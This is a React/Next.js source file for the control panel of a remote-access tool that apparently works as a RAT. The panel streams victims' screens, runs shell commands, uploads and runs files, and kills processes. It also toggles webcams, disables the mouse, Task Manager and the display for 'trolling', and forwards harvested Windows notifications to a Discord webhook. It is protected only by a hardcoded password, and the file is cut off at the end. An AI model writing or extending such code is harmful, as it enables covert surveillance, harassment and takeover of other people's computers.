"use client";

import { Fragment, useCallback, useEffect, useRef, useState } from "react";
import {
  MonitorPlay, Loader2, Search, Plus, X, Upload, Download, Trash2, Pause, Play,
  Skull, AlertTriangle, Maximize2, Power, Folder, Monitor,
} from "lucide-react";
import { toast } from "sonner";
import { Toaster } from "@/components/ui/sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";

const API = "https://python-backend-y3ul.onrender.com";

type Device = { name: string; ip: string; os: string; status: string; last_seen: string };
type Log = (msg: string) => void;
type Tab = "Files" | "Processes" | "Terminal" | "Logs" | "Troll" | "Win Noti" | "Webcam";
const TABS: Tab[] = ["Files", "Processes", "Terminal", "Logs", "Troll", "Win Noti", "Webcam"];

const panel = "bg-[#17191d] border border-[#25282e] rounded-lg";
const accent = "bg-[#6b8cbe] hover:bg-[#7c9bc8] text-[#0b0c0e]";
const isOnline = (d: Device) => d.status?.toLowerCase() === "online";

async function sendCommand(device_id: string, command: string) {
  const res = await fetch(`${API}/api/command`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ device_id, command }),
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return (await res.json()) as { ok: boolean };
}

function Spinner({ label }: { label: string }) {
  return (
    <div className="flex items-center gap-2 text-[#8a93a3] p-4">
      <Loader2 className="h-4 w-4 animate-spin" /> {label}
    </div>
  );
}

function encodeWav(samples: Int16Array, sampleRate: number): ArrayBuffer {
  const buffer = new ArrayBuffer(44 + samples.length * 2);
  const view = new DataView(buffer);
  const writeStr = (off: number, s: string) => { for (let i = 0; i < s.length; i++) view.setUint8(off + i, s.charCodeAt(i)); };
  writeStr(0, "RIFF");
  view.setUint32(4, 36 + samples.length * 2, true);
  writeStr(8, "WAVE");
  writeStr(12, "fmt ");
  view.setUint32(16, 16, true);
  view.setUint16(20, 1, true);
  view.setUint16(22, 1, true);
  view.setUint32(24, sampleRate, true);
  view.setUint32(28, sampleRate * 2, true);
  view.setUint16(32, 2, true);
  view.setUint16(34, 16, true);
  writeStr(36, "data");
  view.setUint32(40, samples.length * 2, true);
  let off = 44;
  for (let i = 0; i < samples.length; i++) { view.setInt16(off, samples[i], true); off += 2; }
  return buffer;
}

function arrayBufferToBase64(buf: ArrayBuffer): string {
  let binary = "";
  const bytes = new Uint8Array(buf);
  for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
  return btoa(binary);
}

export default function Page() {
  const [authed, setAuthed] = useState(false);
  const [pw, setPw] = useState("");
  const [pwError, setPwError] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined" && localStorage.getItem("authed") === "1") setAuthed(true);
  }, []);

  const login = () => {
    // change this password
    if (pw === "2485") {
      localStorage.setItem("authed", "1");
      setAuthed(true);
    } else {
      setPwError("wrong password");
    }
  };

  if (!authed) {
    return (
      <div className="flex h-screen items-center justify-center bg-[#0b0c0e] text-[#d8dce3]">
        <div className="w-80 space-y-3 p-6 border border-[#25282e] rounded-lg bg-[#111316]">
          <h1 className="text-lg font-semibold text-[#e8ecf2]">Login</h1>
          <Input type="password" value={pw} onChange={(e) => setPw(e.target.value)} placeholder="password" className="bg-[#0f1114] border-[#25282e]" />
          {pwError && <div className="text-red-400 text-xs">{pwError}</div>}
          <Button onClick={login} className={accent + " w-full"}>Enter</Button>
        </div>
      </div>
    );
  }

  // existing Page body below...
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [hidden, setHidden] = useState<Set<string>>(new Set());
  const [sessions, setSessions] = useState<Set<string>>(new Set());
  const [selected, setSelected] = useState("");
  const [tab, setTab] = useState<Tab>("Terminal");
  const [logs, setLogs] = useState<string[]>([]);

  const log: Log = useCallback((m) => {
    setLogs((l) => [...l, `${new Date().toLocaleTimeString()}  ${m}`].slice(-500));
  }, []);

  const load = useCallback(async () => {
    try {
      const res = await fetch(`${API}/api/devices`, { cache: "no-store" });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const raw = await res.json();
      const mapped = (raw || []).map((d: any) => ({
        name: d?.name ?? "unknown",
        ip: d?.ip ?? "",
        os: d?.os ?? "",
        status: d?.status ?? "offline",
        last_seen: d?.last_seen ?? "",
      }));
      setDevices(mapped);
      setError(null);
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Network error";
      setError(msg);
    } finally {
      setLoading(false);
    }
  }, [log]);

  useEffect(() => {
    load();
    const t = setInterval(load, 5000);
    return () => clearInterval(t);
  }, [load]);

  const visible = devices.filter((d) => !hidden.has(d.name));
  const current = visible.find((d) => d.name === selected) ?? visible[0];

  const remove = (d: Device) => {
    setHidden((h) => new Set(h).add(d.name));
    setSessions((s) => { const n = new Set(s); n.delete(d.name); return n; });
    toast(`${d.name} removed from this view`);
    log(`Device hidden: ${d.name}`);
  };

  return (
    <div className="flex h-screen bg-[#0b0c0e] text-[#d8dce3] font-[Inter,'Segoe_UI',system-ui,sans-serif] text-sm">
      <aside className="w-52 shrink-0 border-r border-[#25282e] bg-[#111316] flex flex-col">
        <div className="h-14 flex items-center gap-2 px-5 border-b border-[#25282e] font-semibold text-[#e8ecf2]">
          <MonitorPlay className="h-5 w-5 text-[#6b8cbe]" /> Remote Desk
        </div>
        <nav className="p-2">
          <div className="flex items-center gap-3 px-3 py-2 rounded-md bg-[#6b8cbe]/15 text-[#9bb5da]">
            <Monitor className="h-4 w-4" /> PC&apos;s
          </div>
        </nav>
      </aside>

      <div className="flex-1 flex flex-col min-w-0">
        <header className="h-14 shrink-0 flex items-center justify-between px-6 border-b border-[#25282e]">
          <h1 className="text-base font-semibold text-[#e8ecf2]">PC&apos;s</h1>
          <div className="flex items-center gap-2 text-xs text-[#8a93a3]">
            <span className={`h-2 w-2 rounded-full ${error ? "bg-red-500" : loading ? "bg-amber-400" : "bg-emerald-400"}`} />
            Backend: {error ? "unreachable" : loading ? "connecting…" : "connected"}
          </div>
        </header>

        <main className="flex-1 overflow-hidden p-4 grid grid-cols-[260px_1fr] gap-4">
          <DeviceList
            devices={visible} current={current} loading={loading} error={error}
            sessions={sessions} onSelect={setSelected} onRemove={remove} reload={load} log={log}
          />
          <div className="min-w-0 overflow-auto space-y-4 pr-1">
            {current ? (
              <>
                <Screen device={current} live={sessions.has(current.name)}
                  onToggle={() => {
                    const on = sessions.has(current.name);
                    setSessions((s) => { const n = new Set(s); on ? n.delete(current.name) : n.add(current.name); return n; });
                    toast(on ? `Disconnected from ${current.name}` : `Connected to ${current.name}`);
                    log(`Session ${on ? "closed" : "opened"}: ${current.name} (${current.ip})`);
                  }} />
                <div className={`${panel} overflow-hidden`}>
                  <div className="flex border-b border-[#25282e] overflow-x-auto">
                    {TABS.map((t) => (
                      <button key={t} onClick={() => setTab(t)}
                        className={`px-4 py-2.5 transition-colors whitespace-nowrap ${tab === t ? "text-[#9bb5da] border-b-2 border-[#6b8cbe]" : "text-[#8a93a3] hover:text-[#d8dce3]"}`}>
                        {t}
                      </button>
                    ))}
                  </div>
                  <div className="p-4">
                    {tab === "Files" && <Files device={current} log={log} />}
                    {tab === "Processes" && <Processes device={current} log={log} />}
                    {tab === "Terminal" && <Terminal device={current} log={log} />}
                    {tab === "Logs" && <Logs logs={logs} />}
                    {tab === "Troll" && <Troll device={current} log={log} />}
                    {tab === "Webcam" && <WebcamTab device={current} log={log} />}
                    {tab === "Win Noti" && <WinNoti device={current} log={log} />}
                  </div>
                </div>
              </>
            ) : (
              <div className={`${panel} p-10 text-center text-[#8a93a3]`}>
                {loading ? "Loading PCs…" : "No PCs yet. Add one on the left."}
              </div>
            )}
          </div>
        </main>
      </div>
      <Toaster theme="dark" />
    </div>
  );
}

function DeviceList({ devices, current, loading, error, sessions, onSelect, onRemove, reload, log }: {
  devices: Device[]; current?: Device; loading: boolean; error: string | null; sessions: Set<string>;
  onSelect: (n: string) => void; onRemove: (d: Device) => void; reload: () => void; log: Log;
}) {
  const [q, setQ] = useState("");
  const [adding, setAdding] = useState(false);
  const [form, setForm] = useState({ name: "", ip: "", os: "" });
  const [saving, setSaving] = useState(false);
  const rows = devices.filter((d) => `${d.name} ${d.ip} ${d.os}`.toLowerCase().includes(q.toLowerCase()));

  const add = async () => {
    if (!form.name || !form.ip) return toast.error("Name and IP are required");
    setSaving(true);
    try {
      const res = await fetch(`${API}/api/devices`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...form, status: "online", last_seen: new Date().toISOString() }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      toast.success(`Added ${form.name}`);
      log(`Device added: ${form.name}`);
      setForm({ name: "", ip: "", os: "" });
      setAdding(false);
      reload();
    } catch (e) {
      toast.error(`Couldn't add PC: ${e instanceof Error ? e.message : "error"}`);
    } finally {
      setSaving(false);
    }
  };

  return (
    <div className={`${panel} flex flex-col min-h-0`}>
      <div className="p-3 space-y-2 border-b border-[#25282e]">
        <div className="relative">
          <Search className="absolute left-3 top-2.5 h-4 w-4 text-[#5d6574]" />
          <Input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search PCs"
            className="pl-9 bg-[#0f1114] border-[#25282e]" />
        </div>
        <Button onClick={() => setAdding(!adding)} className={`w-full ${accent}`}>
          <Plus className="h-4 w-4 mr-1" /> Add PC
        </Button>
        {adding && (
          <div className="space-y-2">
            {(["name", "ip", "os"] as const).map((k) => (
              <Input key={k} placeholder={k === "ip" ? "IP address" : k === "os" ? "OS" : "Name"} value={form[k]}
                onChange={(e) => setForm({ ...form, [k]: e.target.value })} className="bg-[#0f1114] border-[#25282e]" />
            ))}
            <Button disabled={saving} onClick={add} className={`w-full ${accent}`}>
              {saving && <Loader2 className="h-4 w-4 mr-1 animate-spin" />} Save PC
            </Button>
          </div>
        )}
      </div>
      <div className="flex-1 overflow-auto">
        {error && (
          <div className="m-3 p-3 rounded-md border border-red-900/60 bg-red-950/30 text-red-300 text-xs flex gap-2">
            <AlertTriangle className="h-4 w-4 shrink-0" />
            <div>Backend unreachable ({error}). <button className="underline" onClick={reload}>Retry</button></div>
          </div>
        )}
        {loading && <Spinner label="Loading PCs…" />}
        {!loading && rows.length === 0 && !error && <div className="p-4 text-[#8a93a3]">No PCs match.</div>}
        {rows.map((d) => (
          <div key={d.name} onClick={() => onSelect(d.name)}
            className={`group flex items-center gap-3 px-3 py-2.5 cursor-pointer border-b border-[#1e2126] ${current?.name === d.name ? "bg-[#6b8cbe]/15" : "hover:bg-[#1c1f24]"}`}>
            <span className={`h-2 w-2 rounded-full shrink-0 ${isOnline(d) ? "bg-emerald-400" : "bg-[#4a505c]"}`} />
            <div className="min-w-0 flex-1">
              <div className="truncate text-[#e8ecf2]">{d.name}</div>
              <div className="truncate text-xs text-[#8a93a3]">{d.ip} · {d.os}</div>
            </div>
            {sessions.has(d.name) && <Badge className="border-[#6b8cbe]/50 text-[#9bb5da]">live</Badge>}
            <button title="Remove" onClick={(e) => { e.stopPropagation(); onRemove(d); }}
              className="opacity-0 group-hover:opacity-100 text-[#8a93a3] hover:text-red-400">
              <X className="h-4 w-4" />
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

function Screen({ device, live, onToggle }: { device: Device; live: boolean; onToggle: () => void }) {
  const [imgSrc, setImgSrc] = useState<string | null>(null);
  const [state, setState] = useState<"loading" | "ok" | "failed" | "waiting">("loading");

  useEffect(() => {
    if (!live) { setImgSrc(null); setState("loading"); return; }
    let cancelled = false;
    const poll = async () => {
      try {
        const res = await fetch(`${API}/api/frame?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        if (cancelled) return;
        if (data.image) {
          setImgSrc(`data:image/jpeg;base64,${data.image}`);
          setState("ok");
        } else {
          setImgSrc(null);
          setState("waiting");
        }
      } catch {
        if (!cancelled) setState("failed");
      }
    };
    poll();
    const t = setInterval(poll, 200);
    return () => { cancelled = true; clearInterval(t); };
  }, [device.name, live]);

  return (
    <div className={`${panel} overflow-hidden`}>
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-[#25282e]">
        <div className="flex items-center gap-3 min-w-0">
          <span className="font-medium text-[#e8ecf2] truncate">{device.name}</span>
          <Badge className={isOnline(device) ? "border-emerald-800 text-emerald-400" : "border-[#33373f] text-[#8a93a3]"}>
            {device.status || "unknown"}
          </Badge>
          <span className="text-xs text-[#8a93a3] truncate">{device.ip} · {device.os} · last seen {device.last_seen}</span>
        </div>
        <div className="flex gap-2 shrink-0">
          <Button size="sm" disabled={!live && !isOnline(device)} onClick={onToggle}
            className={live ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
            <Power className="h-3.5 w-3.5 mr-1" /> {live ? "Disconnect" : "Connect"}
          </Button>
        </div>
      </div>
      <div className="relative aspect-video bg-black flex items-center justify-center">
        {live ? (
          imgSrc ? (
            // eslint-disable-next-line @next/next/no-img-element
            <img src={imgSrc} alt={`${device.name} desktop`} className="w-full h-full object-contain" />
          ) : (
            <div className="text-[#5d6574]">
              {state === "waiting" ? "Waiting for stream…" : state === "failed" ? "Can't reach backend" : "Loading…"}
            </div>
          )
        ) : (
          <div className="text-[#5d6574]">Not connected. Press Connect to open the desktop.</div>
        )}
      </div>
    </div>
  );
}

function Files({ device, log }: { device: Device; log: Log }) {
  const [path, setPath] = useState(".");
  const [files, setFiles] = useState<{ name: string; type: string; size: number }[]>([]);
  const [loading, setLoading] = useState(true);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const load = useCallback(async () => {
    try {
      const res = await fetch(`${API}/api/files?device=${encodeURIComponent(device.name)}&path=${encodeURIComponent(path)}`, { cache: "no-store" });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setFiles(data.files || []);
    } catch {
      setFiles([]);
    } finally {
      setLoading(false);
    }
  }, [device.name, path]);

  useEffect(() => { setLoading(true); load(); const t = setInterval(load, 5000); return () => clearInterval(t); }, [load]);

  const upload = async (file: File) => {
    const reader = new FileReader();
    reader.onload = async () => {
      const b64 = (reader.result as string).split(",")[1];
      try {
        await fetch(`${API}/api/runfiles`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ device: device.name, name: file.name, content: b64 }),
        });
      } catch { /* ignore */ }
    };
    reader.readAsDataURL(file);
  };

  const download = async (name: string) => {
    const res = await fetch(`${API}/api/file?device=${encodeURIComponent(device.name)}&path=${encodeURIComponent(path + "/" + name)}`, { cache: "no-store" });
    if (!res.ok) { toast.error("file not found"); return; }
    const data = await res.json();
    if (!data.content) { toast.error("no content"); return; }
    const a = document.createElement("a");
    a.href = `data:application/octet-stream;base64,${data.content}`;
    a.download = name;
    a.click();
    log(`Downloaded ${name}`);
  };

  const remove = async (name: string) => {
    await fetch(`${API}/api/file?device=${encodeURIComponent(device.name)}&path=${encodeURIComponent(path + "/" + name)}`, { method: "DELETE" });
    toast(`Deleted ${name}`);
    log(`Deleted ${name}`);
    load();
  };

  const goUp = () => {
    const parts = path.split("/").filter(Boolean);
    parts.pop();
    setPath(parts.length ? parts.join("/") : ".");
  };

  return (
    <div className="space-y-3">
      <div className="flex gap-2 items-center">
        <Button size="sm" variant="outline" className="bg-transparent" onClick={goUp}>Up</Button>
        <Input value={path} onChange={(e) => setPath(e.target.value)} placeholder="path" className="flex-1 bg-[#0f1114] border-[#25282e]" />
        <Button size="sm" variant="outline" className="bg-transparent" onClick={load}>Go</Button>
        <label className="ml-auto">
          <Button size="sm" variant="outline" className="bg-transparent" onClick={() => fileInputRef.current?.click()}>
            <Upload className="h-3.5 w-3.5 mr-1" />Upload
          </Button>
          <input ref={fileInputRef} type="file" className="hidden" onChange={(e) => { if (e.target.files?.[0]) upload(e.target.files[0]); }} />
        </label>
        <Button size="sm" variant="outline" className="bg-transparent" onClick={load}>Refresh</Button>
      </div>
      {loading && <Spinner label="Loading files…" />}
      {!loading && files.length === 0 && <div className="text-[#8a93a3] p-4">No files (backend may not have listings yet).</div>}
      <div className="border border-[#25282e] rounded-md overflow-hidden">
        {files.map((f) => (
          <div key={f.name} className="flex items-center justify-between px-3 py-2 border-b border-[#1e2126] hover:bg-[#1c1f24]">
            <div className="flex items-center gap-2 min-w-0">
              <Folder className="h-3.5 w-3.5 opacity-60" />
              <span className="truncate text-[#e8ecf2]">{f.name}</span>
              <span className="text-xs text-[#5d6574]">{f.type} {f.size ? `· ${f.size}B` : ""}</span>
            </div>
            <div className="flex gap-1">
              <Button size="sm" variant="ghost" onClick={() => download(f.name)}><Download className="h-3.5 w-3.5" /></Button>
              <Button size="sm" variant="ghost" className="text-red-400" onClick={() => remove(f.name)}><Trash2 className="h-3.5 w-3.5" /></Button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function Processes({ device, log }: { device: Device; log: Log }) {
  const [procs, setProcs] = useState<{ pid: number; name: string; cpu: number; mem: number; state: string }[]>([]);
  const [loading, setLoading] = useState(true);
  const [q, setQ] = useState("");

  useEffect(() => {
    let cancelled = false;
    const load = async () => {
      try {
        const res = await fetch(`${API}/api/processes?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        if (!cancelled) setProcs(data.processes || []);
      } catch {
        // keep empty
      } finally {
        if (!cancelled) setLoading(false);
      }
    };
    load();
    const t = setInterval(load, 5000);
    return () => { cancelled = true; clearInterval(t); };
  }, [device.name]);

  const run = async (pid: number, name: string, action: "kill" | "suspend" | "resume") => {
    try {
      await sendCommand(device.name, `${action} ${pid}`);
      setProcs((p) => action === "kill" ? p.filter((x) => x.pid !== pid)
        : p.map((x) => x.pid === pid ? { ...x, state: action === "suspend" ? "suspended" : "running" } : x));
      toast.success(`${action} ${name} (${pid})`);
      log(`${device.name}: ${action} ${pid}`);
    } catch (e) {
      toast.error(`Command failed: ${e instanceof Error ? e.message : "error"}`);
    }
  };

  const rows = procs.filter((p) => `${p.pid} ${p.name}`.toLowerCase().includes(q.toLowerCase()));

  if (loading) return <Spinner label="Loading processes…" />;
  if (procs.length === 0) return <div className="text-[#8a93a3] p-4">No process data from backend yet.</div>;

  return (
    <div className="space-y-2">
      <div className="relative">
        <Search className="absolute left-3 top-2.5 h-4 w-4 text-[#5d6574]" />
        <Input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Search processes"
          className="pl-9 bg-[#0f1114] border-[#25282e]" />
      </div>
      <Table>
        <TableHeader>
          <TableRow className="border-[#25282e] hover:bg-transparent">
            {["PID", "Name", "CPU %", "Memory MB", "State", ""].map((h) => <TableHead key={h} className="text-[#8a93a3]">{h}</TableHead>)}
          </TableRow>
        </TableHeader>
        <TableBody>
          {rows.map((p) => (
            <TableRow key={p.pid} className="border-[#25282e] hover:bg-[#1c1f24]">
              <TableCell>{p.pid}</TableCell><TableCell className="text-[#e8ecf2]">{p.name}</TableCell>
              <TableCell>{p.cpu}</TableCell><TableCell>{p.mem}</TableCell>
              <TableCell><Badge className="border-[#33373f]">{p.state}</Badge></TableCell>
              <TableCell className="text-right space-x-1 whitespace-nowrap">
                <Button size="sm" variant="ghost" onClick={() => run(p.pid, p.name, p.state === "suspended" ? "resume" : "suspend")}>
                  {p.state === "suspended" ? <Play className="h-3.5 w-3.5 mr-1" /> : <Pause className="h-3.5 w-3.5 mr-1" />}
                  {p.state === "suspended" ? "Resume" : "Suspend"}
                </Button>
                <Button size="sm" variant="ghost" className="text-red-400" onClick={() => run(p.pid, p.name, "kill")}>
                  <Skull className="h-3.5 w-3.5 mr-1" />Kill
                </Button>
              </TableCell>
            </TableRow>
          ))}
        </TableBody>
      </Table>
    </div>
  );
}

function Terminal({ device, log }: { device: Device; log: Log }) {
  const [cmd, setCmd] = useState("");
  const [busy, setBusy] = useState(false);
  const [hist, setHist] = useState<{ cmd: string; out: string; err?: boolean }[]>([]);
  const end = useRef<HTMLDivElement>(null);
  useEffect(() => end.current?.scrollIntoView({ block: "nearest" }), [hist]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const c = cmd.trim();
    if (!c) return;
    setCmd(""); setBusy(true);
    try {
      await sendCommand(device.name, c);
      let output = "";
      for (let i = 0; i < 20; i++) {
        await new Promise((r) => setTimeout(r, 500));
        try {
          const res = await fetch(`${API}/api/command_result?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
          if (res.ok) {
            const data = await res.json();
            if (data.output && data.output !== output) { output = data.output; break; }
          }
        } catch { /* ignore */ }
      }
      setHist((h) => [...h, { cmd: c, out: output || "command sent", err: !output }]);
      log(`${device.name}$ ${c}`);
    } catch (err) {
      const m = err instanceof Error ? err.message : "error";
      setHist((h) => [...h, { cmd: c, out: m, err: true }]);
      toast.error(`Command failed: ${m}`);
    } finally { setBusy(false); }
  };

  return (
    <div className="h-72 flex flex-col bg-black rounded-md border border-[#25282e] font-mono text-[13px]">
      <div className="flex-1 overflow-auto p-3 space-y-2">
        {hist.length === 0 && <div className="text-[#5d6574]">Type a command and press Enter.</div>}
        {hist.map((h, i) => (
          <div key={i}>
            <div className="text-[#9bb5da]">{device.name}$ {h.cmd}</div>
            <div className={h.err ? "text-red-400" : "text-[#a9b1bd]"}>{h.out}</div>
          </div>
        ))}
        <div ref={end} />
      </div>
      <form onSubmit={submit} className="flex items-center gap-2 border-t border-[#25282e] px-3 py-2">
        <span className="text-[#6b8cbe]">$</span>
        <input value={cmd} onChange={(e) => setCmd(e.target.value)} disabled={busy}
          className="flex-1 bg-transparent outline-none" placeholder="ipconfig /all" />
        {busy && <Loader2 className="h-4 w-4 animate-spin text-[#8a93a3]" />}
      </form>
    </div>
  );
}

function Troll({ device, log }: { device: Device; log: Log }) {
  const [tts, setTts] = useState("");
  const [mouseOff, setMouseOff] = useState(false);
  const [black, setBlack] = useState(false);
  const [tmOff, setTmOff] = useState(false);
  const [webcamOn, setWebcamOn] = useState(false);
  const [recording, setRecording] = useState(false);
  const [audioB64, setAudioB64] = useState("");
  const [audioUrl, setAudioUrl] = useState("");
  const audioCtxRef = useRef<AudioContext | null>(null);
  const sourceRef = useRef<MediaStreamAudioSourceNode | null>(null);
  const processorRef = useRef<ScriptProcessorNode | null>(null);
  const samplesRef = useRef<Float32Array[]>([]);
  const streamRef = useRef<MediaStream | null>(null);

  const send = async (cmd: string, label: string) => {
    try {
      await sendCommand(device.name, cmd);
      toast.success(label);
      log(`${device.name}: ${label}`);
    } catch (e) {
      toast.error(`Failed: ${e instanceof Error ? e.message : "error"}`);
    }
  };

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      streamRef.current = stream;
      const audioCtx = new AudioContext({ sampleRate: 16000 });
      audioCtxRef.current = audioCtx;
      const source = audioCtx.createMediaStreamSource(stream);
      sourceRef.current = source;
      const processor = audioCtx.createScriptProcessor(4096, 1, 1);
      processorRef.current = processor;
      samplesRef.current = [];
      processor.onaudioprocess = (e) => {
        samplesRef.current.push(new Float32Array(e.inputBuffer.getChannelData(0)));
      };
      source.connect(processor);
      processor.connect(audioCtx.destination);
      setRecording(true);
      setAudioB64("");
      setAudioUrl("");
    } catch {
      toast.error("mic access denied");
    }
  };

  const stopRecording = () => {
    if (!recording) return;
    setRecording(false);
    if (processorRef.current) { processorRef.current.disconnect(); processorRef.current = null; }
    if (sourceRef.current) { sourceRef.current.disconnect(); sourceRef.current = null; }
    if (streamRef.current) { streamRef.current.getTracks().forEach((t) => t.stop()); streamRef.current = null; }
    const samples = samplesRef.current;
    let total = 0;
    for (const s of samples) total += s.length;
    const pcm = new Int16Array(total);
    let off = 0;
    for (const s of samples) {
      for (let i = 0; i < s.length; i++) {
        let v = s[i];
        if (v > 1) v = 1; if (v < -1) v = -1;
        pcm[off++] = v * 0x7fff;
      }
    }
    const wav = encodeWav(pcm, 16000);
    const b64 = arrayBufferToBase64(wav);
    setAudioB64(b64);
    setAudioUrl(URL.createObjectURL(new Blob([wav], { type: "audio/wav" })));
    toast.success("recorded");
  };

  const previewVoice = () => {
    if (!audioUrl) { toast.error("no recording"); return; }
    const audio = new Audio(audioUrl);
    audio.play();
  };

  const sendVoice = async () => {
    if (!audioB64) { toast.error("no recording"); return; }
    await send(`voice:${audioB64}`, "voice sent");
    setAudioB64("");
    setAudioUrl("");
  };

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        <div className="font-medium text-[#e8ecf2]">Text to Speech</div>
        <div className="flex gap-2">
          <Input value={tts} onChange={(e) => setTts(e.target.value)} placeholder="text to speak" className="bg-[#0f1114] border-[#25282e]" />
          <Button onClick={() => { if (tts.trim()) { send(`tts:${tts.trim()}`, "TTS sent"); setTts(""); } }} className={accent}>Speak</Button>
        </div>
      </div>
      <div className="space-y-2">
        <div className="font-medium text-[#e8ecf2]">Voice Message</div>
        <div className="flex gap-2 items-center">
          <Button onClick={startRecording} disabled={recording} className={accent}>Start Record</Button>
          <Button onClick={stopRecording} disabled={!recording} variant="outline" className="bg-transparent">Stop</Button>
          <Button onClick={previewVoice} variant="outline" className="bg-transparent" disabled={!audioB64}>Preview</Button>
          <Button onClick={sendVoice} className={accent} disabled={!audioB64}>Send</Button>
          {recording && <span className="text-xs text-red-400 animate-pulse">recording…</span>}
        </div>
      </div>
      <div className="flex flex-wrap gap-2">
        <Button onClick={() => { setMouseOff(!mouseOff); send(mouseOff ? "mouse:on" : "mouse:off", mouseOff ? "mouse enabled" : "mouse disabled"); }}
          className={mouseOff ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
          {mouseOff ? "Enable Mouse" : "Disable Mouse"}
        </Button>
        <Button onClick={() => { setBlack(!black); send(black ? "blackscreen:off" : "blackscreen:on", black ? "black screen off" : "black screen on"); }}
          className={black ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
          {black ? "Black Screen Off" : "Black Screen On"}
        </Button>
        <Button onClick={() => { setTmOff(!tmOff); send(tmOff ? "disabletm:off" : "disabletm:on", tmOff ? "task mgr enabled" : "task mgr disabled"); }}
          className={tmOff ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
          {tmOff ? "Enable Task Mgr" : "Disable Task Mgr"}
        </Button>
        <Button onClick={() => { setWebcamOn(!webcamOn); send(webcamOn ? "webcam:off" : "webcam:on", webcamOn ? "webcam off" : "webcam on"); }}
          className={webcamOn ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
          {webcamOn ? "Webcam Off" : "Webcam On"}
        </Button>
      </div>
    </div>
  );
}

function WinNoti({ device, log }: { device: Device; log: Log }) {
  const [keywords, setKeywords] = useState("");
  const [webhook, setWebhook] = useState("");
  const [notifs, setNotifs] = useState<string[]>([]);

  const loadKw = async () => {
    try {
      const res = await fetch(`${API}/api/keywords?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        setKeywords((data.keywords || []).join("\n"));
      }
    } catch { /* ignore */ }
  };

  const loadWh = async () => {
    try {
      const res = await fetch(`${API}/api/webhook?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        setWebhook(data.webhook || "");
      }
    } catch { /* ignore */ }
  };

  const saveKw = async () => {
    const kws = keywords.split("\n").map((k) => k.trim()).filter(Boolean);
    await fetch(`${API}/api/keywords`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ device: device.name, keywords: kws }),
    });
    await sendCommand(device.name, `setkeywords:${kws.join("\n")}`);
    toast.success("keywords saved");
    log(`${device.name}: win noti keywords updated`);
  };

  const saveWh = async () => {
    await fetch(`${API}/api/webhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ device: device.name, webhook }),
    });
    toast.success("webhook saved");
  };

  const loadNotifs = async () => {
    try {
      const res = await fetch(`${API}/api/winnoti?device=${encodeURIComponent(device.name)}`, { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        setNotifs(data.notifications || []);
      }
    } catch { /* ignore */ }
  };

  useEffect(() => { loadKw(); loadWh(); loadNotifs(); const t = setInterval(loadNotifs, 3000); return () => clearInterval(t); }, [device.name]);

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        <div className="font-medium text-[#e8ecf2]">Keywords to monitor (one per line)</div>
        <textarea value={keywords} onChange={(e) => setKeywords(e.target.value)}
          className="w-full h-24 bg-[#0f1114] border border-[#25282e] rounded-md p-2 text-sm text-[#d8dce3]" />
        <Button onClick={saveKw} className={accent}>Save Keywords</Button>
      </div>
      <div className="space-y-2">
        <div className="font-medium text-[#e8ecf2]">Discord Webhook URL</div>
        <div className="flex gap-2">
          <Input value={webhook} onChange={(e) => setWebhook(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="bg-[#0f1114] border-[#25282e]" />
          <Button onClick={saveWh} className={accent}>Save</Button>
        </div>
      </div>
    </div>
  );
}

function WebcamTab({ device, log }: { device: Device; log: Log }) {
  const [on, setOn] = useState(false);
  const send = async (cmd: string, label: string) => {
    try {
      await sendCommand(device.name, cmd);
      toast.success(label);
      log(`${device.name}: ${label}`);
    } catch (e) {
      toast.error(`Failed: ${e instanceof Error ? e.message : "error"}`);
    }
  };
  return (
    <div className="space-y-4">
      <div className="font-medium text-[#e8ecf2]">Webcam Stream</div>
      <Button onClick={() => { setOn(!on); send(on ? "webcam:off" : "webcam:on", on ? "webcam off" : "webcam on"); }}
        className={on ? "bg-red-900/60 hover:bg-red-900 text-red-100" : accent}>
        {on ? "Webcam Off" : "Webcam On"}
      </Button>
      <p className="text-xs text-[#5d6574]">Toggles the agent camera. The main stream view will show webcam footage when on.</p>
    </div>
